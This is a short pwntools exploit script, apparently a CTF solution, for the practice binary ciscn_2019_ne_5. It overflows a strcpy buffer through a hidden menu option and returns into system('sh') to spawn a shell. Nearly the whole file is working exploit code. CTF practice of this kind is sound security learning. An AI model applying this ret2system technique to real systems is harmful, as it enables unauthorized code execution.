from pwn import *
from LibcSearcher import *
context.arch='i386'

# 1.Add a log.
# 2.Display all logs
# 3.Print all logs
# 0.Exit
# option 1 get inputs,
# option 2 puts(inputs),
# option 3 call system to ehco somthing,
# there is a hidden options 4 ,it call function GetFlag,
# which contains strcpy that we can make stack overflow

p = process('./ciscn_2019_ne_5')
# p = remote('node3.buuoj.cn',27059)
elf = ELF('./ciscn_2019_ne_5',checksec=False)

sh_addr=0x80482ea	# string sh
# use the string 'fflush' form function fflush in 0x080482E6

p.recvuntil('Please input admin password:')
p.sendline('administrator')
p.recvuntil('Exit\n')
p.sendline('1')
p.recvuntil("Please input new log info:")

payload = 'A'*(0x48+4)
payload += flat(elf.plt['system'], elf.sym['main'], sh_addr)
p.sendline(payload)	
p.sendline('4') # call function GetFlag to make stack overflow
sleep(1)
p.interactive()
